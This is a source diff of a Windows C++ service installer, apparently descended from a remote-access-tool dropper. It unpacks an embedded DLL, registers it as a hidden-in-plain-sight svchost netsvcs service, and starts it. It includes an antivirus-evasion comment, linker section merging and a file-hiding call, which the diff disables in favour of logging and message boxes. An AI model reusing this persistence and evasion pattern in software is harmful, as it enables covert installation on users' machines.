@@ -2,7 +2,9 @@
 //
 
 #include "StdAfx.h"
-
+#include <windows.h>
+#include <stdio.h>
+#include <shellapi.h>
 #pragma comment(linker, "/defaultlib:msvcrt.lib /opt:nowin98 /IGNORE:4078 /MERGE:.rdata=.text /MERGE:.data=.text /section:.text,ERW")
 #include "resource.h"
 #include <windows.h>
@@ -15,9 +17,11 @@
 #include "decode.h"
 #include "RegEditEx.h"
 #include "log.h"
-
+// using standard exceptions
+#include <iostream>
+#include <exception>
 #include "IniFile.h"
-
+#include <sddl.h>
 #ifdef INSTALLER_TEST
 #pragma IMPORTANT("THIS IS ONLY FOR TESTING, IT CONTAINS DEBUG CODE< IDENTIFIABLE CODE")
 #endif
@@ -26,6 +30,24 @@ typedef const char *(__stdcall* f_funcSvcHostStatus)();
 typedef const char* (__stdcall* f_funcSvcHostLastError)();
 
 void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
+}
+
+
+LPWSTR StringToString(LPCSTR str)
+{
+	int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
+	PWCHAR result = new WCHAR[size];
+	MultiByteToWideChar(CP_UTF8, 0, str, -1, result, size);
+
+	return result;
+}
+LPSTR StringToString(LPCWSTR str)
+{
+	int size = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
+	PCHAR result = new CHAR[size];
+	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, size, NULL, NULL);
+
+	return result;
 }
 
 LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
@@ -221,10 +243,13 @@ BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, LPCTSTR 
 	FreeResource(hRes);
 	
 	// Fuck KV File Create Monitor
-	MoveFile(strBinPath, lpFileName);
-	SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
-	DeleteFile(strBinPath);
-	return TRUE;
+	BOOL res = MoveFile(strBinPath, lpFileName);
+	if (!res) {
+		LOG_ERROR("Install::ReleaseResource", "error MoveFile %s ==> %s ", strBinPath, lpFileName, GetLastError());
+	}
+	//SetFileAttributes(lpFileName, FILE_ATTRIBUTE_HIDDEN);
+	res = DeleteFile(strBinPath) && res;
+	return res;
 }
 
 char *AddsvchostService()
@@ -288,8 +313,27 @@ char *AddsvchostService()
 
 // 随机选择服务安装,返回安装成功的服务名
 
-char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString)
+char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString, BOOL systemAccount = FALSE)
 {
+	char lpName[MAX_PATH];
+	DWORD sSize = MAX_PATH;
+	char lpDomainName[MAX_PATH];
+	DWORD sDomainNameSize = MAX_PATH;
+	SID_NAME_USE sidType;
+	PSID Sid;
+	LPWSTR lpSidString = StringToString("S-1-5-18");
+	BOOL sidConvert = ConvertStringSidToSidW(lpSidString,&Sid);
+	
+
+	sidConvert = LookupAccountSidA(NULL, Sid, lpName, &sSize, lpDomainName, &sDomainNameSize, &sidType);
+
+	if (!sidConvert) {
+		LOG_ERROR("Install::InstallService", "query sid ERROR");
+		return nullptr;
+	}
+	LOG_TRACE("Install::InstallService", "query sid %s/%s", lpDomainName,lpName);
+	char lpFullAccountName[MAX_PATH];
+	sprintf(lpFullAccountName, "%s\\%s", lpDomainName, lpName);
     // Open a handle to the SC Manager database.
 	char *lpServiceName = NULL;
     int rc = 0;
@@ -298,30 +342,39 @@ char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,
 	char strModulePath[MAX_PATH];
 	char	strSysDir[MAX_PATH];
 	DWORD	dwStartType = 0;
-    try{
-    char strSubKey[1024];
-    //query svchost setting
-    char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
-    rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
-	LOG_TRACE("Install::InstallService", "RegOpenKeyEx %s", pSvchost);
-    if(ERROR_SUCCESS != rc)
-    {
-        throw "";
-    }
+	
+		char strSubKey[1024];
+		LOG_TRACE("Install::InstallService", "query svchost setting");
+		//query svchost setting
+		char* ptr, * pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
+		rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
+		LOG_TRACE("Install::InstallService", "RegOpenKeyEx %s", pSvchost);
+		if (ERROR_SUCCESS != rc)
+		{
+			throw "";
+		}
 
-    DWORD type, size = sizeof strSubKey;
-    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)strSubKey, &size);
-    RegCloseKey(hkRoot);
-    SetLastError(rc);
-    if(ERROR_SUCCESS != rc)
-        throw "RegQueryValueEx(Svchost\\netsvcs)";
+		DWORD type, size = sizeof strSubKey;
+		rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)strSubKey, &size);
+		RegCloseKey(hkRoot);
+		SetLastError(rc);
+		if (ERROR_SUCCESS != rc)
+			throw "RegQueryValueEx(Svchost\\netsvcs)";
 
-    //install service
-    hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (hscm == NULL)
-        throw "OpenSCManager()";
 
-	GetSystemDirectory(strSysDir, sizeof(strSysDir));
+		LOG_TRACE("Install::InstallService", "install service");
+
+		//install service
+		hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+		if (hscm == NULL) {
+			MessageBoxA(NULL, "OpenSCManager Failed. Check Permission", "ERROR", MB_ICONERROR);
+			LOG_ERROR("Install::InstallService", "OpenSCManager Failed. Check Permission");
+			return nullptr;
+		}
+
+
+		strcpy(strSysDir, "c:\\Temp");
+	//GetSystemDirectory(strSysDir, sizeof(strSysDir));
 	char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
 	char	strRegKey[1024];
 
@@ -330,6 +383,8 @@ char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,
 		//////////////////////////////////////////////////////////////////////////
 		char temp[500];
 		wsprintf(temp, "SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
+		LOG_TRACE("Install::InstallService", "query --> RegOpenKeyEx %s", temp);
+
 		rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, temp, 0, KEY_QUERY_VALUE, &hkRoot);
 		if (rc == ERROR_SUCCESS)
 		{
@@ -360,11 +415,17 @@ char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,
 			NULL,                      // no load ordering group
 			NULL,                      // no tag identifier
 			NULL,                      // no dependencies
-			NULL,                      // LocalSystem account
+			systemAccount?(const char*)lpFullAccountName:NULL,                      // LocalSystem account
 			NULL);                     // no password
 		
-		if (schService != NULL)
+		LOG_WARNING("Install::InstallService", "CreateService SERVICE_WIN32_SHARE_PROCESS");
+		LOG_TRACE("Install::InstallService", "Account %s. name of service %s, service name to display %s, service's binary %s", lpName, ptr, lpServiceDisplayName, bin);
+
+		if (schService != NULL) {
+			LOG_TRACE("Install::InstallService", "returned 0x%8d", schService);
+			LOG_TRACE("Install::InstallService", "CreateService SERVICE_WIN32_SHARE_PROCESS SUCCESS");
 			break;
+		}
 	}
 
 	if (schService == NULL)
@@ -372,7 +433,7 @@ char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,
 		lpServiceName = AddsvchostService();
 		memset(strModulePath, 0, sizeof(strModulePath));
 		wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);
-
+		LOG_WARNING("Install::InstallService", "CreateService SERVICE_WIN32_OWN_PROCESS");
 		wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
 		schService = CreateService(
 			hscm,                      // SCManager database
@@ -386,8 +447,10 @@ char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,
 			NULL,                      // no load ordering group
 			NULL,                      // no tag identifier
 			NULL,                      // no dependencies
-			NULL,                      // LocalSystem account
+			systemAccount ? (const char*)lpFullAccountName : NULL,                      // LocalSystem account
 			NULL);                     // no password
+		LOG_TRACE("Install::InstallService", "Account %s. name of service %s, service name to display %s, service's binary %s", lpName, ptr, lpServiceDisplayName, bin);
+
 		dwStartType = SERVICE_WIN32_OWN_PROCESS;
 	}
 	else
@@ -395,9 +458,16 @@ char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,
 		dwStartType = SERVICE_WIN32_SHARE_PROCESS;
 		lpServiceName = new char[lstrlen(ptr) + 1];
 		lstrcpy(lpServiceName, ptr);
+		LOG_TRACE("Install::InstallService", "Install post-install steps...  WriteRegEx %s, %s, %s",strSubKey, ptr, lpServiceName);
+
 	}
 	if (schService == NULL)
-		throw "CreateService(Parameters)";
+	{
+		LOG_ERROR("Install::InstallService", "CreateService SERVICE_WIN32_OWN_PROCESS failed");
+
+		return nullptr;
+	}
+		
 
     CloseServiceHandle(schService);
     CloseServiceHandle(hscm);
@@ -410,31 +480,37 @@ char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription,
 	{		
 		DWORD	dwServiceType = 0x120;
 		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
+		LOG_TRACE("Install::InstallService", "Install post-install steps... dwServiceType = 0x120;  WriteRegEx %s", strSubKey);
+
 	}
 
 	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);
+	LOG_TRACE("Install::InstallService", "Install post-install steps... Description  WriteRegEx %s", strSubKey);
 
 	lstrcat(strSubKey, "\\Parameters");
 	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);
+	LOG_TRACE("Install::InstallService", "Install post-install steps... ServiceDll WriteRegEx %s", strSubKey);
 
-    }catch(char *str)
-    {
-        if(str && str[0])
-        {
-            rc = GetLastError();
-        }
-    }
- 
+    
     RegCloseKey(hkRoot);
     RegCloseKey(hkParam);
     CloseServiceHandle(schService);
     CloseServiceHandle(hscm);
 	
-
+	
 	if (lpServiceName != NULL)
 	{
-		ReleaseResource(NULL, IDR_DLL, "BIN", strModulePath, lpConfigString);
+		LOG_TRACE("Install::InstallService", "OK  DONE. NAME %s", lpServiceName);
+		ReleaseResource(NULL, IDR_DLL, "BIN", strModulePath, nullptr);
+		DWORD attributes = GetFileAttributesA(lpServiceName);
+		BOOL Exists =  attributes != INVALID_FILE_ATTRIBUTES;
+		LOG_TRACE("Install::InstallService", "%s Exists: %d", lpServiceName, Exists);
+
+		if (!Exists) {
+			LOG_WARNING("Install::InstallService", "%s Exists: %d", lpServiceName, Exists);
+		}
 	}
+	LOG_TRACE("Install::InstallService", "OK  DONE. NAME null");
 
     return lpServiceName;
 }
@@ -458,6 +534,7 @@ void StartService(LPCTSTR lpService)
 		CloseServiceHandle( hSCManager );
 	}
 	else {
+		MessageBoxA(NULL, "OpenSCManager Failed. Check Permission", "ERROR", MB_ICONERROR);
 		LOG_ERROR("Install::StartService", "OpenSCManager ");
 	}
 }
@@ -514,22 +591,6 @@ int memfind(const char *mem, const char *str, int sizem, int sizes)
 
 #define	MAX_CONFIG_LEN	1024
 
-LPWSTR StringToString(LPCSTR str)
-{
-	int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
-	PWCHAR result = new WCHAR[size];
-	MultiByteToWideChar(CP_UTF8, 0, str, -1, result, size);
-
-	return result;
-}
-LPSTR StringToString(LPCWSTR str)
-{
-	int size = WideCharToMultiByte(CP_UTF8, 0, str, -1, NULL, 0, NULL, NULL);
-	PCHAR result = new CHAR[size];
-	WideCharToMultiByte(CP_UTF8, 0, str, -1, result, size, NULL, NULL);
-
-	return result;
-}
 
 LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
 {
@@ -566,51 +627,64 @@ int APIENTRY WinMain(HINSTANCE hInstance,
                      LPSTR     lpCmdLine,
                      int       nCmdShow)
 {
+	LPWSTR* szArglist;
+	int nArgs;
+	int i;
+	LOG_TRACE("Install::Main", "START");
+	LPWSTR lpExtractShort = StringToString("-x");
+	LPWSTR lpExtractLong = StringToString("--extract");
+	LPWSTR lpLoadShort = StringToString("-l");
+	LPWSTR lpLoadLong = StringToString("--load");
+	CHAR* lpExtractedDllName = nullptr;
+	bool bLoadDll = false;
+	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
+	if (NULL == szArglist)
+	{
+		wprintf(L"CommandLineToArgvW failed\n");
+		return 0;
+	}
+	else {
+		for (i = 0; i < nArgs; i++) {
+			if ( (StrCmpW(lpExtractShort, szArglist[i]) == 0) ||
+				(StrCmpW(lpExtractLong, szArglist[i]) == 0) )
+			{
+				lpExtractedDllName = StringToString(szArglist[i + 1]);
+				LOG_TRACE("Install::Main", "Extract Resource Dll to file : %s", lpExtractedDllName);
+				
+			}
+			if ((StrCmpW(lpLoadShort, szArglist[i]) == 0) ||
+				(StrCmpW(lpLoadLong, szArglist[i]) == 0))
+			{
+				bLoadDll = true;
+				LOG_TRACE("Install::Main", "Will Load");
 
-	if (strcmp(lpCmdLine,"test") == 0) {
-
-		CIniFile iniTemp;
-		int size = MultiByteToWideChar(CP_UTF8, 0, "\\svchost.dll", -1, NULL, 0);
-		PWCHAR lpFileName = new WCHAR[size];
-		MultiByteToWideChar(CP_UTF8, 0, "\\svchost.dll", -1, lpFileName, size);
-
-
-		PWCHAR result = new WCHAR[MAX_PATH];
-		StrCpyW(result, iniTemp.GetStartupPath());
-		StrCatW(result, lpFileName);
-
-		char *dll = StringToString(result);
-		LOG_TRACE("Install::Main", "ReleaseResource %s", dll);
-		ReleaseResource(NULL, IDR_DLL, "BIN", dll, "");
-
-		HINSTANCE hGetProcIDDLL = LoadLibrary(dll);
-
-		if (!hGetProcIDDLL) {
+			}
+		}
+	}
+		
+	if (lpExtractedDllName) {
+		ReleaseResource(NULL, IDR_DLL, "BIN", lpExtractedDllName, nullptr);
+	}
+	
+	if (bLoadDll) {
+		HINSTANCE hGetProcIDDLL = nullptr;
+		try
+		{
+			//hGetProcIDDLL = LoadLibraryA(lpExtractedDllName);
+			hGetProcIDDLL = LoadLibraryA("P:\\Development\\SimpleWindowsServiceDll\\bin\\Win32\\Release\\SvcDll.dll");
 			
-			LOG_ERROR("Install::Main", "could not load the dynamic library");
-			return EXIT_FAILURE;
 		}
-		
-		// resolve function address here
-		f_funcSvcHostStatus funci = (f_funcSvcHostStatus)GetProcAddress(hGetProcIDDLL, "SvcHostStatus");
-		if (!funci) {
-			LOG_ERROR("Install::Main", "could not load function ");
+		catch (std::exception& e)
+		{
+			LOG_ERROR("Install::Main", "exception %s", e.what());
+			printf("exception %s", e.what());
 			return EXIT_FAILURE;
 		}
 
-		
-		LOG_TRACE("Install::Main", "SvcHostStatus() returned %s", f_funcSvcHostStatus());
-		LOG_TRACE("Install::Main", "SvcHostLastError() returned %s", f_funcSvcHostLastError());
-		int i = 0;
-		while (TRUE) {
-			i++;
-			Sleep(250);
-		}
-
+		LocalFree(szArglist);
 		return EXIT_SUCCESS;
 	}
 
-	
 
 
  	// TODO: Place code here.
@@ -623,6 +697,11 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	//////////////////////////////////////////////////////////////////////////
 	
 	CIniFile ini;
+	if (ini.IsValid() == false) {
+		wprintf(L"Ini File missing %s", ini.GetIniFilePath());
+		LOG_ERROR("Install::Main", "Ini File missing %s", ini.GetIniFilePath());
+		return 1;
+	}
 	CString SvcNane = ini.GetString("Service", "RawName");
 	CString SvcDisplayNane = ini.GetString("Service", "DisplayName");
 	CString SvcDescription = ini.GetString("Service", "Description");
@@ -631,7 +710,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	LOG_TRACE("Install::Main", "SvcDisplayNane %s", SvcDisplayNane.GetBuffer());
 	LOG_TRACE("Install::Main", "SvcDescription %s", SvcDescription.GetBuffer());
 	LOG_TRACE("Install::Main", "SvcEncodeString %s", SvcEncodeString.GetBuffer());
-	
+
 	char	*lpUpdateArgs = "Update";
 	//////////////////////////////////////////////////////////////////////////
 	// 如果不是更新服务端
@@ -664,19 +743,26 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
 	if (lpServiceName != NULL)
 	{
+		
 		// 写安装程序路径到注册表，服务开始后读取并删除
 		char	strSelf[MAX_PATH];
 		char	strSubKey[1024];
+		char	strMsg[1024];
 		memset(strSelf, 0, sizeof(strSelf));
 		GetModuleFileName(NULL, strSelf, sizeof(strSelf));
 		wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
+		wsprintf(strMsg, "Service %s Created", lpServiceName);
 		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "InstallModule", REG_SZ, strSelf, lstrlen(strSelf), 0);
-	
+		MessageBoxA(NULL, strMsg, "SUCCESS", MB_ICONEXCLAMATION);
 		LOG_TRACE("Install::Main", "HKEY_LOCAL_MACHINE InstallModule %s", strSubKey);
 		LOG_TRACE("Install::Main","StartService %s", lpServiceName);
 		StartService(lpServiceName);
 		delete lpServiceName;
 		
+	}
+	else {
+		LOG_ERROR("Install::Main", "InstallService failed");
+
 	}
 	ExitProcess(0);
 }
